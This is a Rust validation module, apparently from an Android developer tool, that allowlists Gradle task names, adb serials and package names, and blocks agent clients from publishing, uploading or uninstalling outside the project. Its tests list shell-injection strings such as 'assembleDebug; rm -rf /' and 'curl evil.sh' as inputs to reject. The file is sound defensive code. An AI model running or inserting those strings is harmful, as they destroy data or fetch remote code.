//! Single source of truth for user-supplied identifier validation.
//!
//! These values reach `adb` and `gradlew` as process arguments. The host
//! never runs them through a shell, but anything sent through `adb shell` IS
//! re-parsed by the device's shell; `utils::device_shell` quotes those
//! arguments. These allowlists are defence in depth on top of that quoting.
//!
//! Both front doors (the Tauri command layer and the MCP server) previously
//! carried their own copies, which had already drifted: the command versions
//! capped lengths and the MCP versions did not. Each caller maps the returned
//! `String` into its own error type.

/// Max length of a Gradle task name.
const MAX_GRADLE_TASK_LEN: usize = 256;

/// Max length of an ADB device serial.
const MAX_DEVICE_SERIAL_LEN: usize = 64;

/// Max length of an activity class name.
const MAX_ACTIVITY_NAME_LEN: usize = 256;

/// Validate a Gradle task name.
///
/// Allowed: alphanumeric, `:`, `-`, `_`, `.`. A leading `-` is rejected: the
/// value is passed to `gradlew` as an argument, where it would be read as a
/// command-line option (`--offline`, `-I init.gradle`, `--stop`, ...).
pub fn validate_gradle_task(task: &str) -> Result<(), String> {
    if task.is_empty() {
        return Err("Gradle task name must not be empty".to_string());
    }
    if task.starts_with('-') {
        return Err(format!(
            "Invalid Gradle task name '{task}': Gradle options are not accepted, only task names"
        ));
    }
    if task.len() > MAX_GRADLE_TASK_LEN {
        return Err(format!(
            "Gradle task name is too long (max {MAX_GRADLE_TASK_LEN} characters)"
        ));
    }
    if !task
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, ':' | '-' | '_' | '.'))
    {
        return Err(format!(
            "Invalid Gradle task name '{task}': only alphanumeric, ':', '-', '_', '.' are allowed"
        ));
    }
    Ok(())
}

/// Validate an ADB device serial.
///
/// Allowed: alphanumeric, `:`, `.`, `-`, `_`.
pub fn validate_device_serial(serial: &str) -> Result<(), String> {
    if serial.is_empty() {
        return Err("Device serial must not be empty".to_string());
    }
    if serial.len() > MAX_DEVICE_SERIAL_LEN {
        return Err(format!(
            "Device serial is too long (max {MAX_DEVICE_SERIAL_LEN} characters)"
        ));
    }
    if !serial
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, ':' | '.' | '-' | '_'))
    {
        return Err(format!(
            "Invalid device serial '{serial}': only alphanumeric, ':', '.', '-', '_' are allowed"
        ));
    }
    Ok(())
}

/// Validate an Android package name.
///
/// Allowed: alphanumeric, `.`, `_`. Must contain at least one `.`.
pub fn validate_package_name(package: &str) -> Result<(), String> {
    if package.is_empty() {
        return Err("Package name cannot be empty".to_string());
    }
    let valid = package
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '.' | '_'));
    if !valid || !package.contains('.') {
        return Err(format!(
            "Invalid package name '{package}'. Expected format: com.example.app"
        ));
    }
    Ok(())
}

/// Validate an activity class name as passed to `am start -n <package>/<activity>`.
///
/// Allowed: alphanumeric, `.`, `_`, `$` (inner classes).
pub fn validate_activity_name(activity: &str) -> Result<(), String> {
    if activity.is_empty() {
        return Err("Activity name cannot be empty".to_string());
    }
    if activity.len() > MAX_ACTIVITY_NAME_LEN {
        return Err(format!(
            "Activity name is too long (max {MAX_ACTIVITY_NAME_LEN} characters)"
        ));
    }
    let valid = activity
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '.' | '_' | '$'));
    if !valid {
        return Err(format!(
            "Invalid activity name '{activity}': only alphanumeric, '.', '_', '$' are allowed"
        ));
    }
    Ok(())
}

/// Task-name patterns MCP clients may not run unless the user enables
/// unrestricted Gradle tasks in the app. Each pattern is a sequence of
/// camelCase words; `Prefix` patterns match at the start of the task name,
/// `Contains` patterns anywhere. These tasks publish, promote, upload, or
/// remove things outside this machine and cannot be undone.
enum DeniedTask {
    Prefix(&'static [&'static str], &'static str),
    Contains(&'static [&'static str], &'static str),
}

const AGENT_DENIED_TASKS: &[DeniedTask] = &[
    DeniedTask::Prefix(&["publish"], "publish*"),
    DeniedTask::Prefix(&["promote"], "promote*"),
    DeniedTask::Prefix(&["upload"], "upload*"),
    DeniedTask::Prefix(&["uninstall"], "uninstall*"),
    DeniedTask::Prefix(&["close", "and", "release"], "closeAndRelease*"),
    DeniedTask::Contains(&["to", "maven", "central"], "*ToMavenCentral"),
    DeniedTask::Contains(&["play", "store"], "*PlayStore*"),
];

/// Split a task name into lowercase words at camelCase humps, `-`, and `_`,
/// the same boundaries Gradle uses to expand abbreviations.
fn task_words(name: &str) -> Vec<String> {
    let mut words: Vec<String> = Vec::new();
    let mut current = String::new();
    for c in name.chars() {
        if c == '-' || c == '_' {
            if !current.is_empty() {
                words.push(std::mem::take(&mut current));
            }
            continue;
        }
        if c.is_uppercase() && !current.is_empty() {
            words.push(std::mem::take(&mut current));
        }
        current.extend(c.to_lowercase());
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// Gradle runs a task from any unambiguous abbreviation of its camelCase
/// words (`pRB` runs `publishReleaseBundle`). A typed word therefore matches
/// a pattern word when either is a prefix of the other.
fn word_matches(typed: &str, pattern: &str) -> bool {
    pattern.starts_with(typed) || typed.starts_with(pattern)
}

fn words_match(typed: &[String], pattern: &[&str]) -> bool {
    typed
        .iter()
        .zip(pattern.iter())
        .all(|(t, p)| word_matches(t, p))
}

/// Reject Gradle tasks that MCP clients may not run by default.
///
/// Matching is abbreviation-aware and case-insensitive, and applies to the
/// task name after any `:project:` path. Call [`validate_gradle_task`] first.
pub fn check_agent_gradle_task(task: &str) -> Result<(), String> {
    let name = task.rsplit(':').next().unwrap_or(task);
    let typed = task_words(name);
    if typed.is_empty() {
        return Ok(());
    }
    for denied in AGENT_DENIED_TASKS {
        let (hit, label) = match denied {
            DeniedTask::Prefix(words, label) => (words_match(&typed, words), label),
            // Try every starting word, including ones too close to the end to
            // hold the whole pattern: Gradle expands a name that stops partway
            // (`releaseToMav`) to the full task (`releaseToMavenCentral`).
            DeniedTask::Contains(words, label) => (
                (0..typed.len()).any(|start| words_match(&typed[start..], words)),
                label,
            ),
        };
        if hit {
            return Err(format!(
                "Gradle task '{task}' is blocked for MCP clients because it matches '{label}', \
                 which publishes, promotes, uploads, or uninstalls outside this machine. Run it yourself \
                 from a terminal, or enable \"Allow unrestricted Gradle tasks\" in Keynobi \
                 Settings → MCP."
            ));
        }
    }
    Ok(())
}

/// Max `applicationIdSuffix` values considered when matching variant packages.
pub const MAX_PACKAGE_SUFFIXES: usize = 16;

/// The package names the open project's app installs as.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ProjectPackageScope {
    /// Base application ids: the default config's and any flavor overrides.
    pub application_ids: Vec<String>,
    /// `applicationIdSuffix` values from build types and product flavors.
    pub suffixes: Vec<String>,
    /// Exact ids of variants that were built (read from the build outputs).
    pub built_ids: Vec<String>,
}

impl ProjectPackageScope {
    pub fn is_empty(&self) -> bool {
        self.application_ids.is_empty() && self.built_ids.is_empty()
    }

    /// Whether `package` is a base id, a base id followed by a combination
    /// of the parsed suffixes (flavor then build type, each used once), or a
    /// built variant's id. `com.example.app` does not cover `com.example.apple`.
    pub fn contains(&self, package: &str) -> bool {
        if self.built_ids.iter().any(|id| id == package) {
            return true;
        }
        let suffixes: Vec<String> = self
            .suffixes
            .iter()
            .filter_map(|s| normalize_suffix(s))
            .take(MAX_PACKAGE_SUFFIXES)
            .collect();
        self.application_ids.iter().any(|id| {
            package
                .strip_prefix(id.as_str())
                .is_some_and(|rest| rest.is_empty() || consumed_by_suffixes(rest, &suffixes, 0))
        })
    }
}

/// AGP adds the separating `.` when a suffix does not start with one.
fn normalize_suffix(suffix: &str) -> Option<String> {
    let s = suffix.trim();
    match s.trim_start_matches('.') {
        "" => None,
        rest => Some(format!(".{rest}")),
    }
}

/// Whether `rest` is exactly a concatenation of distinct `suffixes`.
fn consumed_by_suffixes(rest: &str, suffixes: &[String], used: u32) -> bool {
    if rest.is_empty() {
        return true;
    }
    suffixes.iter().enumerate().any(|(i, s)| {
        used & (1 << i) == 0
            && rest
                .strip_prefix(s.as_str())
                .is_some_and(|tail| consumed_by_suffixes(tail, suffixes, used | (1 << i)))
    })
}

/// Refuse a destructive or permission-changing MCP call on a package that is
/// not the open project's app. `tool` names the calling tool in the message.
///
/// Callers skip this check when the client passed `allow_foreign_package: true`.
pub fn check_agent_package_scope(
    tool: &str,
    package: &str,
    scope: &ProjectPackageScope,
) -> Result<(), String> {
    if scope.is_empty() {
        return Err(format!(
            "{tool} refused '{package}': the open project's applicationId could not be \
             determined, so Keynobi cannot confirm this package belongs to it. Open the \
             Android project (or start the server with --project), or pass \
             allow_foreign_package: true if the user explicitly asked to act on '{package}'."
        ));
    }
    if scope.contains(package) {
        return Ok(());
    }
    let mut known: Vec<&str> = scope
        .application_ids
        .iter()
        .chain(scope.built_ids.iter())
        .map(String::as_str)
        .collect();
    known.sort_unstable();
    known.dedup();
    Err(format!(
        "{tool} refused '{package}': it is not the open project's app ({}; variant \
         suffixes: {}). Use the project's package, or pass allow_foreign_package: true \
         only if the user explicitly asked to act on '{package}'.",
        known.join(", "),
        if scope.suffixes.is_empty() {
            "none found".to_string()
        } else {
            scope.suffixes.join(", ")
        }
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Gradle task ──────────────────────────────────────────────────────────

    #[test]
    fn gradle_task_accepts_valid() {
        for task in [
            "assembleDebug",
            "app:assembleRelease",
            "clean",
            "test_unit",
            "lib-core:build",
            "check.all",
        ] {
            assert!(validate_gradle_task(task).is_ok(), "should accept {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_shell_injection() {
        for task in [
            "assembleDebug; rm -rf /",
            "assembleDebug && curl evil.sh",
            "$(whoami)",
            "`id`",
            "a|b",
            "a b",
            "a>out",
        ] {
            assert!(validate_gradle_task(task).is_err(), "should reject {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_options() {
        for task in [
            "--offline",
            "-Iinit.gradle",
            "--stop",
            "-Pfoo",
            "--scan",
            "-q",
        ] {
            assert!(validate_gradle_task(task).is_err(), "should reject {task}");
        }
        assert!(validate_gradle_task("lib-core:build").is_ok());
    }

    #[test]
    fn agent_policy_blocks_publishing_uploading_and_uninstalling() {
        for task in [
            "publish",
            "publishReleaseBundle",
            ":app:publishReleaseBundle",
            "publishToMavenLocal",
            "publishing",
            "PUBLISH",
            "uploadCrashlyticsMappingFileRelease",
            "uninstallAll",
            "uninstallDebug",
            "closeAndReleaseRepository",
            "publishAllPublicationsToMavenCentralRepository",
            "releaseToMavenCentral",
            "deployPlayStore",
            "playStoreUpload",
            "promoteArtifact",
            "promoteReleaseArtifact",
            ":app:promotePaidReleaseArtifact",
            // Names that stop partway into a denied word sequence.
            "releaseTo",
            "releaseToMav",
            "deployPlay",
            // Abbreviations Gradle would expand to a denied task.
            "pRB",
            "pub",
            "uA",
            "un-all",
            "cAR",
            "pRA",
        ] {
            assert!(
                check_agent_gradle_task(task).is_err(),
                "should block {task}"
            );
        }
    }

    #[test]
    fn agent_policy_allows_ordinary_tasks() {
        for task in [
            "assembleDebug",
            ":app:assemblePaidRelease",
            "bundleRelease",
            "clean",
            "check",
            "lint",
            "testDebugUnitTest",
            "connectedAndroidTest",
            "installDebug",
            "packageDebug",
            "preBuild",
            "compileDebugKotlin",
            "bundleReleaseClassesToCompileJar",
            "dependencies",
            "tasks",
            "projects",
            "properties",
            "processDebugResources",
            "processReleaseManifest",
        ] {
            assert!(check_agent_gradle_task(task).is_ok(), "should allow {task}");
        }
    }

    #[test]
    fn gradle_task_rejects_empty_and_overlong() {
        assert!(validate_gradle_task("").is_err());
        assert!(validate_gradle_task(&"a".repeat(MAX_GRADLE_TASK_LEN + 1)).is_err());
        assert!(validate_gradle_task(&"a".repeat(MAX_GRADLE_TASK_LEN)).is_ok());
    }

    // ── Device serial ────────────────────────────────────────────────────────

    #[test]
    fn device_serial_accepts_valid() {
        for serial in [
            "emulator-5554",
            "192.168.1.10:5555",
            "R58M12ABCDE",
            "device_1",
        ] {
            assert!(
                validate_device_serial(serial).is_ok(),
                "should accept {serial}"
            );
        }
    }

    #[test]
    fn device_serial_rejects_injection() {
        for serial in ["a; rm -rf /", "$(id)", "a b", "a&&b", "a/../b"] {
            assert!(
                validate_device_serial(serial).is_err(),
                "should reject {serial}"
            );
        }
    }

    /// The MCP copy of this validator had no length cap. Consolidating applies
    /// the command layer's stricter limit to both front doors.
    #[test]
    fn device_serial_rejects_empty_and_overlong() {
        assert!(validate_device_serial("").is_err());
        assert!(validate_device_serial(&"a".repeat(MAX_DEVICE_SERIAL_LEN + 1)).is_err());
        assert!(validate_device_serial(&"a".repeat(MAX_DEVICE_SERIAL_LEN)).is_ok());
    }

    // ── Package name ─────────────────────────────────────────────────────────

    #[test]
    fn package_name_accepts_valid() {
        for pkg in ["com.example.app", "com.example.app.debug", "a.b"] {
            assert!(validate_package_name(pkg).is_ok(), "should accept {pkg}");
        }
    }

    #[test]
    fn package_name_rejects_invalid() {
        for pkg in ["", "noDotsHere", "com.example; rm -rf /", "com example"] {
            assert!(validate_package_name(pkg).is_err(), "should reject {pkg}");
        }
    }

    // ── Package scope ────────────────────────────────────────────────────────

    fn scope(ids: &[&str], suffixes: &[&str], built: &[&str]) -> ProjectPackageScope {
        let owned = |v: &[&str]| v.iter().map(|s| s.to_string()).collect();
        ProjectPackageScope {
            application_ids: owned(ids),
            suffixes: owned(suffixes),
            built_ids: owned(built),
        }
    }

    #[test]
    fn package_scope_allows_the_application_id_and_its_variant_suffixes() {
        let s = scope(&["com.example.app"], &[".debug", "demo", ".full"], &[]);
        for pkg in [
            "com.example.app",
            "com.example.app.debug",
            "com.example.app.demo",
            "com.example.app.demo.debug",
            "com.example.app.full.debug",
        ] {
            assert!(
                check_agent_package_scope("stop_app", pkg, &s).is_ok(),
                "{pkg}"
            );
        }
    }

    #[test]
    fn package_scope_rejects_lookalikes_and_foreign_packages() {
        let s = scope(&["com.example.app"], &[".debug"], &[]);
        for pkg in [
            "com.example.apple",
            "com.example.app.debugger",
            "com.example.app.debug.debug",
            "com.example.app.other",
            "com.example",
            "com.google.android.gms",
        ] {
            let err = check_agent_package_scope("stop_app", pkg, &s).unwrap_err();
            assert!(err.contains("allow_foreign_package: true"), "{err}");
            assert!(err.contains("com.example.app"), "{err}");
        }
    }

    #[test]
    fn package_scope_accepts_built_variant_ids_exactly() {
        let s = scope(&[], &[], &["com.example.app.staging"]);
        assert!(check_agent_package_scope("t", "com.example.app.staging", &s).is_ok());
        assert!(check_agent_package_scope("t", "com.example.app", &s).is_err());
    }

    #[test]
    fn package_scope_refuses_everything_when_the_project_id_is_unknown() {
        let err = check_agent_package_scope(
            "revoke_runtime_permission",
            "com.example.app",
            &scope(&[], &[], &[]),
        )
        .unwrap_err();
        assert!(err.contains("could not be determined"), "{err}");
        assert!(err.contains("allow_foreign_package: true"), "{err}");
    }
}
